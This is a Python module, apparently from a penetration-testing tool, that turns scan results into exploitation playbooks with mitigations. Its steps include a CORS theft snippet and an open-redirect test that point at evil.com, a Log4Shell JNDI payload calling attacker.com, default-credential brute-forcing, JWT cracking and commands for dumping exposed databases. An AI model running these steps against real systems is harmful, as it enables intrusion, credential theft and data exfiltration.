"""Attack chain pattern database — maps finding combinations to exploitation playbooks.

Each pattern function takes scan data and returns AttackChain objects if the
conditions match. This is where the magic happens: correlating subdomains,
ports, tech stacks, secrets, and misconfigurations into step-by-step
exploitation chains that a human tester can follow.
"""
from __future__ import annotations

import hashlib
import logging
from typing import Any

from scoutx.chains.models import AttackChain, AttackStep

logger = logging.getLogger("scoutx.chains.patterns")


# ---------------------------------------------------------------------------
# Pattern 1: Subdomain Takeover
# ---------------------------------------------------------------------------
def detect_subdomain_takeover(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Dangling CNAMEs pointing to unclaimed cloud services."""
    chains: list[AttackChain] = []
    takeover_data = scan_data.get("takeover", {})
    vulnerable = takeover_data.get("vulnerable", [])

    for entry in vulnerable:
        sub = entry.get("subdomain", "")
        service = entry.get("service", "unknown")
        cname = entry.get("cname", "")
        chain_id = f"chain-takeover-{hashlib.md5(sub.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"Subdomain Takeover: {sub} ({service})",
            severity="high",
            confidence=0.85,
            category="takeover",
            description=(
                f"The subdomain {sub} has a CNAME record pointing to {cname} "
                f"which resolves to an unclaimed {service} service. An attacker "
                f"can claim this service and serve malicious content on {sub}, "
                f"potentially stealing cookies or phishing users."
            ),
            target_host=sub,
            affected_assets=[sub],
            prerequisites=[
                f"CNAME {sub} -> {cname} (dangling)",
                f"Service: {service} (unclaimed)",
            ],
            steps=[
                AttackStep(1, "Verify CNAME is still dangling",
                           f"dig CNAME {sub}", "dig",
                           f"Should return {cname}"),
                AttackStep(2, "Confirm service is unclaimed",
                           f"curl -sI https://{cname}", "curl",
                           "404 or connection refused"),
                AttackStep(3, f"Register the {service} service",
                           f"# Sign up at {service} and claim the hostname {cname}",
                           "browser", f"Claim {cname} on {service}"),
                AttackStep(4, "Deploy proof-of-concept page",
                           "# Upload a simple HTML file with your identifier",
                           "browser", f"Visit https://{sub} and verify your content appears"),
                AttackStep(5, "Test cookie scope for parent domain",
                           f"# Check if cookies from {sub} can be read by parent domain",
                           "browser", "Document cookie scope for escalation potential"),
            ],
            tools_needed=["dig", "curl", "browser"],
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover",
                "https://github.com/EdOverflow/can-i-take-over-xyz",
            ],
            mitigation="Remove the dangling CNAME record or reclaim the service.",
            evidence=entry,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 2: CORS Misconfiguration -> Credential Theft
# ---------------------------------------------------------------------------
def detect_cors_theft(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Permissive CORS allowing cross-origin credential exfiltration."""
    chains: list[AttackChain] = []
    cors_data = scan_data.get("cors", {})
    findings = cors_data.get("findings", [])

    for finding in findings:
        if finding.get("severity", "").lower() not in ("high", "critical"):
            continue
        url = finding.get("url", "")
        issue = finding.get("issue", "")
        chain_id = f"chain-cors-{hashlib.md5(url.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"CORS Credential Theft: {url}",
            severity="high",
            confidence=0.75,
            category="data_exfil",
            description=(
                f"The endpoint {url} has a permissive CORS policy ({issue}). "
                f"An attacker can create a malicious page that reads authenticated "
                f"responses from this endpoint, stealing user data or tokens."
            ),
            target_host=url,
            affected_assets=[url],
            prerequisites=[
                f"CORS misconfiguration at {url}",
                "Victim visits attacker-controlled page while authenticated",
            ],
            steps=[
                AttackStep(1, "Verify CORS misconfiguration",
                           f'curl -sI -H "Origin: https://evil.com" {url} | grep -i access-control',
                           "curl", "Access-Control-Allow-Origin: https://evil.com with credentials"),
                AttackStep(2, "Create exploitation PoC",
                           "# Create HTML file with fetch() to target endpoint",
                           "editor",
                           "JavaScript: fetch(url, {credentials:'include'}).then(r=>r.text()).then(d=>sendToAttacker(d))"),
                AttackStep(3, "Host PoC on attacker domain",
                           "python3 -m http.server 8080", "python3",
                           "Serve the PoC HTML"),
                AttackStep(4, "Test with authenticated session",
                           "# Open PoC page in browser while logged into target",
                           "browser", "Verify cross-origin data is readable"),
            ],
            tools_needed=["curl", "python3", "browser"],
            references=["https://portswigger.net/web-security/cors"],
            mitigation="Restrict Access-Control-Allow-Origin to trusted domains. Never reflect arbitrary origins with credentials.",
            evidence=finding,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 3: Exposed Secrets -> Account Takeover
# ---------------------------------------------------------------------------
def detect_secret_exploitation(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Leaked API keys, tokens, or credentials in JS/source code."""
    chains: list[AttackChain] = []
    secrets_data = scan_data.get("secrets", {})
    findings = secrets_data.get("findings", [])

    for finding in findings:
        sev = finding.get("severity", "").lower()
        if sev not in ("critical", "high"):
            continue
        secret_type = finding.get("type", "unknown")
        file_path = finding.get("file", "")
        matched = finding.get("match", "")[:50] + "..."
        chain_id = f"chain-secret-{hashlib.md5(matched.encode()).hexdigest()[:8]}"

        steps = [
            AttackStep(1, f"Extract the {secret_type} from source",
                       f"# Found in: {file_path}", "grep",
                       f"Secret type: {secret_type}"),
        ]

        if "aws" in secret_type.lower() or "akia" in matched.lower():
            steps.extend([
                AttackStep(2, "Validate AWS credentials",
                           "aws sts get-caller-identity", "aws-cli",
                           "Returns account ID and ARN if valid"),
                AttackStep(3, "Enumerate permissions",
                           "aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)",
                           "aws-cli", "Lists attached policies"),
                AttackStep(4, "Check S3 access",
                           "aws s3 ls", "aws-cli",
                           "Lists accessible buckets"),
            ])
        elif "jwt" in secret_type.lower() or "eyj" in matched.lower():
            steps.extend([
                AttackStep(2, "Decode JWT payload",
                           "echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool",
                           "base64", "Reveals claims: role, email, exp"),
                AttackStep(3, "Test None algorithm attack",
                           "# Modify header alg to 'none', remove signature",
                           "jwt_tool", "If accepted, full auth bypass"),
                AttackStep(4, "Brute-force weak secret",
                           "hashcat -a 0 -m 16500 '<token>' wordlist.txt",
                           "hashcat", "Cracks weak HMAC secrets"),
            ])
        elif "api" in secret_type.lower() or "key" in secret_type.lower():
            steps.extend([
                AttackStep(2, "Identify the service",
                           "# Google the key prefix to determine the API provider",
                           "browser", "e.g., AIza* = Google, sk_live_* = Stripe"),
                AttackStep(3, "Test key validity",
                           "# Make an API call with the discovered key",
                           "curl", "200 OK = key is live"),
                AttackStep(4, "Enumerate accessible resources",
                           "# List what the key can access",
                           "curl", "Check for data access, admin endpoints"),
            ])
        else:
            steps.append(
                AttackStep(2, "Validate the credential",
                           "# Test the discovered credential against the service",
                           "curl", "Confirm it's live and determine scope"),
            )

        chains.append(AttackChain(
            id=chain_id,
            title=f"Exposed {secret_type} -> Potential Account Takeover",
            severity=sev,
            confidence=0.7,
            category="credential_exposure",
            description=(
                f"A {secret_type} was found exposed in {file_path}. "
                f"If this credential is live, an attacker can use it to "
                f"access the associated service, potentially leading to "
                f"data exfiltration or full account takeover."
            ),
            target_host=file_path,
            affected_assets=[file_path],
            prerequisites=[f"Exposed {secret_type} in client-side code"],
            steps=steps,
            tools_needed=["curl", "grep", "browser"],
            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
            mitigation=f"Rotate the {secret_type} immediately. Move secrets to server-side environment variables.",
            evidence=finding,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 4: Exposed Database Ports -> Data Exfiltration
# ---------------------------------------------------------------------------
def detect_exposed_databases(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Open database ports (MongoDB, Redis, Elasticsearch, etc.)."""
    chains: list[AttackChain] = []
    ports_data = scan_data.get("ports", {})

    DB_PORTS = {
        3306: ("MySQL", "mysql -h {host} -u root --password=''", "mysql"),
        5432: ("PostgreSQL", "psql -h {host} -U postgres -d postgres", "psql"),
        27017: ("MongoDB", "mongosh {host}:27017", "mongosh"),
        6379: ("Redis", "redis-cli -h {host} INFO", "redis-cli"),
        9200: ("Elasticsearch", "curl http://{host}:9200/_cat/indices", "curl"),
        5984: ("CouchDB", "curl http://{host}:5984/_all_dbs", "curl"),
        11211: ("Memcached", "echo 'stats' | nc {host} 11211", "nc"),
    }

    hosts_with_ports = ports_data.get("hosts", {})
    if isinstance(hosts_with_ports, list):
        # Normalize list format
        normalized = {}
        for entry in hosts_with_ports:
            if isinstance(entry, dict):
                host = entry.get("host", entry.get("hostname", ""))
                open_ports = entry.get("ports", entry.get("open_ports", []))
                if host:
                    normalized[host] = open_ports
        hosts_with_ports = normalized

    for host, ports in hosts_with_ports.items():
        port_list = ports if isinstance(ports, list) else []
        for port_entry in port_list:
            port_num = port_entry if isinstance(port_entry, int) else port_entry.get("port", 0)
            if port_num in DB_PORTS:
                db_name, connect_cmd, tool = DB_PORTS[port_num]
                chain_id = f"chain-db-{hashlib.md5(f'{host}:{port_num}'.encode()).hexdigest()[:8]}"

                chains.append(AttackChain(
                    id=chain_id,
                    title=f"Exposed {db_name} on {host}:{port_num}",
                    severity="critical",
                    confidence=0.6,
                    category="data_exfil",
                    description=(
                        f"{db_name} is exposed on {host}:{port_num}. If no "
                        f"authentication is required, an attacker can directly "
                        f"connect and dump all data."
                    ),
                    target_host=host,
                    affected_assets=[f"{host}:{port_num}"],
                    prerequisites=[f"{db_name} port {port_num} is open on {host}"],
                    steps=[
                        AttackStep(1, f"Verify {db_name} is accessible",
                                   f"nmap -sV -p {port_num} {host}", "nmap",
                                   f"Service: {db_name}"),
                        AttackStep(2, "Attempt unauthenticated connection",
                                   connect_cmd.format(host=host), tool,
                                   "Connection successful without credentials"),
                        AttackStep(3, "Enumerate databases/collections",
                                   f"# List all databases on {host}:{port_num}",
                                   tool, "Database listing"),
                        AttackStep(4, "Check for sensitive data",
                                   "# Query for user tables, credentials, PII",
                                   tool, "Document findings"),
                    ],
                    tools_needed=["nmap", tool],
                    references=[f"https://book.hacktricks.xyz/network-services-pentesting/pentesting-{db_name.lower()}"],
                    mitigation=f"Restrict {db_name} to internal networks. Enable authentication. Use firewall rules.",
                    evidence={"host": host, "port": port_num, "service": db_name},
                ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 5: SSL/TLS Weaknesses -> Traffic Interception
# ---------------------------------------------------------------------------
def detect_ssl_downgrade(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Weak TLS versions or cipher suites enabling traffic interception."""
    chains: list[AttackChain] = []
    ssl_data = scan_data.get("ssl_analysis", {})
    findings = ssl_data.get("findings", ssl_data.get("certificates", []))

    for finding in findings:
        if isinstance(finding, dict):
            host = finding.get("host", finding.get("hostname", ""))
            issues = finding.get("issues", [])
            tls_versions = finding.get("tls_versions", [])

            weak_tls = [v for v in tls_versions if v in ("TLSv1", "TLSv1.0", "TLSv1.1", "SSLv3")]
            if not weak_tls and not issues:
                continue

            chain_id = f"chain-ssl-{hashlib.md5(host.encode()).hexdigest()[:8]}"
            chains.append(AttackChain(
                id=chain_id,
                title=f"SSL/TLS Downgrade: {host}",
                severity="medium",
                confidence=0.7,
                category="traffic_interception",
                description=(
                    f"The host {host} supports deprecated TLS versions "
                    f"({', '.join(weak_tls) if weak_tls else 'weak config'}). "
                    f"An attacker on the same network can force a protocol "
                    f"downgrade and intercept encrypted traffic."
                ),
                target_host=host,
                affected_assets=[host],
                prerequisites=["Attacker on same network (MITM position)", f"Weak TLS on {host}"],
                steps=[
                    AttackStep(1, "Enumerate supported TLS versions",
                               f"nmap --script ssl-enum-ciphers -p 443 {host}", "nmap",
                               "Lists all supported cipher suites and TLS versions"),
                    AttackStep(2, "Test for specific weak protocols",
                               f"openssl s_client -connect {host}:443 -tls1", "openssl",
                               "Connection succeeds = TLS 1.0 supported"),
                    AttackStep(3, "Check for BEAST/POODLE vulnerability",
                               f"testssl.sh {host}", "testssl.sh",
                               "Flags known SSL/TLS vulnerabilities"),
                ],
                tools_needed=["nmap", "openssl", "testssl.sh"],
                references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security"],
                mitigation="Disable TLS 1.0/1.1 and SSLv3. Use TLS 1.2+ with strong cipher suites only.",
                evidence=finding,
            ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 6: Open Redirect -> OAuth Token Theft
# ---------------------------------------------------------------------------
def detect_open_redirect_chain(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Open redirects near OAuth flows enabling token theft."""
    chains: list[AttackChain] = []
    endpoints_data = scan_data.get("endpoints", {})
    all_endpoints = endpoints_data.get("endpoints", [])

    # Find redirect parameters and OAuth endpoints
    redirect_params = []
    oauth_endpoints = []
    for ep in all_endpoints:
        url = ep if isinstance(ep, str) else ep.get("url", "")
        url_lower = url.lower()
        if any(p in url_lower for p in ("redirect", "return", "next", "url=", "goto", "continue")):
            redirect_params.append(url)
        if any(p in url_lower for p in ("oauth", "authorize", "callback", "login", "sso")):
            oauth_endpoints.append(url)

    if redirect_params and oauth_endpoints:
        chain_id = f"chain-redirect-oauth-{hashlib.md5(redirect_params[0].encode()).hexdigest()[:8]}"
        chains.append(AttackChain(
            id=chain_id,
            title="Open Redirect + OAuth -> Account Takeover",
            severity="high",
            confidence=0.6,
            category="auth_bypass",
            description=(
                f"Found {len(redirect_params)} potential redirect parameters and "
                f"{len(oauth_endpoints)} OAuth endpoints. If any redirect is exploitable, "
                f"an attacker can steal OAuth authorization codes by manipulating the "
                f"redirect_uri to their controlled domain."
            ),
            target_host=redirect_params[0],
            affected_assets=redirect_params[:5] + oauth_endpoints[:5],
            prerequisites=["Open redirect vulnerability", "OAuth/SSO authentication flow"],
            steps=[
                AttackStep(1, "Test redirect parameters for open redirect",
                           f"curl -sI '{redirect_params[0]}=https://evil.com' | grep -i location",
                           "curl", "Location header points to evil.com"),
                AttackStep(2, "Identify OAuth authorization endpoint",
                           f"# Found: {oauth_endpoints[0] if oauth_endpoints else 'N/A'}",
                           "browser", "Locate the /authorize or /oauth/callback endpoint"),
                AttackStep(3, "Craft malicious redirect_uri",
                           "# Replace redirect_uri with open redirect URL that chains to attacker",
                           "browser", "OAuth code sent to attacker via redirect chain"),
                AttackStep(4, "Capture authorization code",
                           "# Monitor attacker server logs for the auth code",
                           "python3", "Extract code from redirect URL"),
                AttackStep(5, "Exchange code for access token",
                           "curl -X POST /oauth/token -d 'code=<stolen>&grant_type=authorization_code'",
                           "curl", "Receive valid access token"),
            ],
            tools_needed=["curl", "browser", "python3"],
            references=[
                "https://portswigger.net/web-security/oauth",
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect",
            ],
            mitigation="Validate redirect_uri strictly. Use allowlists for OAuth redirect URIs.",
            evidence={"redirect_params": redirect_params[:10], "oauth_endpoints": oauth_endpoints[:10]},
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 7: Nuclei Critical Findings -> Exploit Chain
# ---------------------------------------------------------------------------
def detect_nuclei_exploits(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Critical Nuclei findings mapped to exploitation steps."""
    chains: list[AttackChain] = []
    nuclei_data = scan_data.get("nuclei", {})
    findings = nuclei_data.get("findings", [])

    for finding in findings:
        sev = finding.get("severity", "").lower()
        if sev not in ("critical", "high"):
            continue

        template_id = finding.get("template_id", "unknown")
        host = finding.get("host", "")
        matched_at = finding.get("matched_at", "")
        desc = finding.get("description", "")
        refs = finding.get("reference", [])
        chain_id = f"chain-nuclei-{hashlib.md5(f'{template_id}-{host}'.encode()).hexdigest()[:8]}"

        chains.append(AttackChain(
            id=chain_id,
            title=f"Nuclei: {finding.get('template_name', template_id)} on {host}",
            severity=sev,
            confidence=0.8,
            category="vulnerability",
            description=desc or f"Nuclei template {template_id} matched on {host}",
            target_host=host,
            affected_assets=[matched_at or host],
            prerequisites=[f"Nuclei template {template_id} matched"],
            steps=[
                AttackStep(1, "Verify finding with manual request",
                           finding.get("curl_command", f"curl -sI {matched_at or host}"),
                           "curl", "Reproduce the vulnerability manually"),
                AttackStep(2, "Re-run nuclei template for confirmation",
                           f"nuclei -t {template_id} -u {host}", "nuclei",
                           "Confirms the vulnerability is reproducible"),
                AttackStep(3, "Check for exploitation path",
                           f"# Research {template_id} for known exploits",
                           "browser", "Search exploit-db, GitHub, blog posts"),
            ],
            tools_needed=["curl", "nuclei", "browser"],
            references=refs if isinstance(refs, list) else [refs] if refs else [],
            mitigation=f"Apply patch or configuration fix for {template_id}.",
            evidence=finding,
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 8: Sensitive Ports -> Lateral Movement
# ---------------------------------------------------------------------------
def detect_sensitive_services(scan_data: dict[str, Any]) -> list[AttackChain]:
    """RDP, SSH, SMB, and other sensitive services exposed to internet."""
    chains: list[AttackChain] = []
    ports_data = scan_data.get("ports", {})

    SENSITIVE = {
        21: ("FTP", "hydra -l admin -P wordlist.txt ftp://{host}", "hydra"),
        22: ("SSH", "ssh -o StrictHostKeyChecking=no root@{host}", "ssh"),
        23: ("Telnet", "telnet {host}", "telnet"),
        445: ("SMB", "smbclient -L //{host} -N", "smbclient"),
        3389: ("RDP", "xfreerdp /v:{host} /u:admin /p:admin", "xfreerdp"),
        5900: ("VNC", "vncviewer {host}:5900", "vncviewer"),
        2375: ("Docker API", "curl http://{host}:2375/containers/json", "curl"),
    }

    hosts_with_ports = ports_data.get("hosts", {})
    if isinstance(hosts_with_ports, list):
        normalized = {}
        for entry in hosts_with_ports:
            if isinstance(entry, dict):
                host = entry.get("host", entry.get("hostname", ""))
                open_ports = entry.get("ports", entry.get("open_ports", []))
                if host:
                    normalized[host] = open_ports
        hosts_with_ports = normalized

    for host, ports in hosts_with_ports.items():
        port_list = ports if isinstance(ports, list) else []
        for port_entry in port_list:
            port_num = port_entry if isinstance(port_entry, int) else port_entry.get("port", 0)
            if port_num in SENSITIVE:
                svc_name, connect_cmd, tool = SENSITIVE[port_num]
                chain_id = f"chain-svc-{hashlib.md5(f'{host}:{port_num}'.encode()).hexdigest()[:8]}"

                chains.append(AttackChain(
                    id=chain_id,
                    title=f"Exposed {svc_name} on {host}:{port_num}",
                    severity="high" if port_num in (2375, 445, 23) else "medium",
                    confidence=0.5,
                    category="lateral_movement",
                    description=f"{svc_name} is exposed on {host}:{port_num}. Test for default credentials and misconfigurations.",
                    target_host=host,
                    affected_assets=[f"{host}:{port_num}"],
                    prerequisites=[f"{svc_name} port {port_num} open"],
                    steps=[
                        AttackStep(1, f"Banner grab {svc_name}",
                                   f"nmap -sV -p {port_num} {host}", "nmap",
                                   f"Identify {svc_name} version"),
                        AttackStep(2, "Test default/common credentials",
                                   connect_cmd.format(host=host), tool,
                                   "Access with default creds"),
                        AttackStep(3, "Check for known CVEs",
                                   f"searchsploit {svc_name}", "searchsploit",
                                   "Known exploits for detected version"),
                    ],
                    tools_needed=["nmap", tool, "searchsploit"],
                    references=[f"https://book.hacktricks.xyz/network-services-pentesting/pentesting-{svc_name.lower()}"],
                    mitigation=f"Restrict {svc_name} access via firewall. Disable if not needed. Use strong credentials.",
                    evidence={"host": host, "port": port_num},
                ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 9: JS Endpoints -> Internal Service Discovery
# ---------------------------------------------------------------------------
def detect_internal_endpoints(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Internal/admin/API endpoints leaked in JavaScript files."""
    chains: list[AttackChain] = []
    endpoints_data = scan_data.get("endpoints", {})
    interesting = endpoints_data.get("interesting", endpoints_data.get("endpoints", []))

    admin_endpoints = []
    api_endpoints = []
    internal_urls = []

    for ep in interesting:
        url = ep if isinstance(ep, str) else ep.get("url", ep.get("endpoint", ""))
        url_lower = url.lower()
        if any(kw in url_lower for kw in ("/admin", "/dashboard", "/internal", "/manage", "/panel")):
            admin_endpoints.append(url)
        elif any(kw in url_lower for kw in ("/api/", "/graphql", "/rest/", "/v1/", "/v2/", "/v3/")):
            api_endpoints.append(url)
        if any(kw in url_lower for kw in ("10.", "172.16", "192.168", "127.0", "localhost", "internal")):
            internal_urls.append(url)

    if admin_endpoints:
        chain_id = f"chain-admin-{hashlib.md5(admin_endpoints[0].encode()).hexdigest()[:8]}"
        chains.append(AttackChain(
            id=chain_id,
            title=f"Admin Panel Discovery via JS ({len(admin_endpoints)} endpoints)",
            severity="high",
            confidence=0.65,
            category="auth_bypass",
            description=f"Found {len(admin_endpoints)} admin/management endpoints in JavaScript files. These may be accessible without proper authorization.",
            target_host=admin_endpoints[0],
            affected_assets=admin_endpoints[:10],
            prerequisites=["Admin endpoints leaked in client-side JS"],
            steps=[
                AttackStep(1, "Test each admin endpoint for access",
                           f"curl -sI {admin_endpoints[0]}", "curl",
                           "200 OK without authentication = direct access"),
                AttackStep(2, "Test with different HTTP methods",
                           f"curl -X POST {admin_endpoints[0]}", "curl",
                           "Some endpoints allow POST without auth"),
                AttackStep(3, "Try default credentials",
                           "# admin:admin, admin:password, admin:123456",
                           "browser", "Common defaults for admin panels"),
                AttackStep(4, "Check for IDOR in admin endpoints",
                           "# Modify user IDs, resource IDs in the URL/body",
                           "burp/curl", "Access other users' data"),
            ],
            tools_needed=["curl", "browser"],
            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information"],
            mitigation="Restrict admin endpoints with proper authentication and authorization. Don't expose admin routes in client-side code.",
            evidence={"admin_endpoints": admin_endpoints[:20]},
        ))

    if internal_urls:
        chain_id = f"chain-internal-{hashlib.md5(internal_urls[0].encode()).hexdigest()[:8]}"
        chains.append(AttackChain(
            id=chain_id,
            title=f"Internal URLs Leaked in JS ({len(internal_urls)} URLs)",
            severity="medium",
            confidence=0.5,
            category="info_disclosure",
            description=f"Found {len(internal_urls)} internal/private IP URLs in JavaScript. These reveal internal infrastructure details.",
            target_host=internal_urls[0],
            affected_assets=internal_urls[:10],
            prerequisites=["Internal URLs in client-side code"],
            steps=[
                AttackStep(1, "Document internal infrastructure",
                           "# Map internal IPs and hostnames", "notes",
                           "Build internal network map"),
                AttackStep(2, "Test for SSRF using internal URLs",
                           "# Use discovered internal URLs as SSRF targets",
                           "curl", "Access internal services via SSRF"),
            ],
            tools_needed=["curl"],
            references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
            mitigation="Remove internal URLs from client-side code. Use environment-based API routing.",
            evidence={"internal_urls": internal_urls[:20]},
        ))
    return chains


# ---------------------------------------------------------------------------
# Pattern 10: Technology Stack -> Known CVE Exploitation
# ---------------------------------------------------------------------------
def detect_tech_cve_chains(scan_data: dict[str, Any]) -> list[AttackChain]:
    """Map detected technologies to known critical CVEs."""
    chains: list[AttackChain] = []
    intel_data = scan_data.get("intelligence", {})
    tech_intel = intel_data.get("tech_intelligence", {})
    detected = tech_intel.get("detected_technologies", [])

    CVE_MAP = {
        "log4j": ("Log4Shell RCE", "critical", "CVE-2021-44228",
                   "Test with ${jndi:ldap://attacker.com/a} in headers/params"),
        "spring": ("Spring4Shell RCE", "critical", "CVE-2022-22965",
                    "Test class.module.classLoader payload"),
        "apache struts": ("Struts RCE", "critical", "CVE-2023-50164",
                          "Test OGNL injection in Content-Type"),
        "confluence": ("Confluence RCE", "critical", "CVE-2023-22527",
                       "Test SSTI in template injection endpoints"),
        "jenkins": ("Jenkins File Read", "critical", "CVE-2024-23897",
                    "Test jenkins-cli.jar argument parsing"),
        "next.js": ("Next.js Auth Bypass", "critical", "CVE-2025-29927",
                    "Test x-middleware-subrequest header bypass"),
        "tomcat": ("Tomcat RCE", "critical", "CVE-2025-24813",
                   "Test partial PUT with deserialization"),
        "wordpress": ("WordPress Plugin Vulns", "high", "Multiple",
                      "Run wpscan --enumerate vp against target"),
        "php": ("PHP CGI RCE", "critical", "CVE-2024-4577",
                "Test Best-Fit encoding bypass on Windows PHP-CGI"),
    }

    for tech in detected:
        tech_lower = tech.lower() if isinstance(tech, str) else ""
        for key, (title, sev, cve, test_cmd) in CVE_MAP.items():
            if key in tech_lower:
                chain_id = f"chain-cve-{hashlib.md5(f'{key}-{cve}'.encode()).hexdigest()[:8]}"
                chains.append(AttackChain(
                    id=chain_id,
                    title=f"{title} ({cve})",
                    severity=sev,
                    confidence=0.5,
                    category="vulnerability",
                    description=f"Detected {tech} which is associated with {cve}. Verify version and test for exploitability.",
                    target_host="",
                    affected_assets=[tech],
                    prerequisites=[f"{tech} detected in technology stack"],
                    steps=[
                        AttackStep(1, "Confirm exact version",
                                   "# Check response headers, error pages for version info",
                                   "curl", "Identify exact version number"),
                        AttackStep(2, "Check if version is vulnerable",
                                   f"# Cross-reference version with {cve}",
                                   "browser", "Compare with affected version ranges"),
                        AttackStep(3, "Test exploitation",
                                   f"# {test_cmd}", "nuclei/curl",
                                   "Attempt controlled exploitation"),
                    ],
                    tools_needed=["curl", "nuclei"],
                    references=[f"https://nvd.nist.gov/vuln/detail/{cve}" if cve != "Multiple" else "https://wpscan.com"],
                    mitigation=f"Update {tech} to the latest patched version.",
                    evidence={"technology": tech, "cve": cve},
                ))
                break  # One chain per tech
    return chains


# ---------------------------------------------------------------------------
# MASTER PATTERN REGISTRY
# ---------------------------------------------------------------------------
ALL_PATTERNS = [
    detect_subdomain_takeover,
    detect_cors_theft,
    detect_secret_exploitation,
    detect_exposed_databases,
    detect_ssl_downgrade,
    detect_open_redirect_chain,
    detect_nuclei_exploits,
    detect_sensitive_services,
    detect_internal_endpoints,
    detect_tech_cve_chains,
]
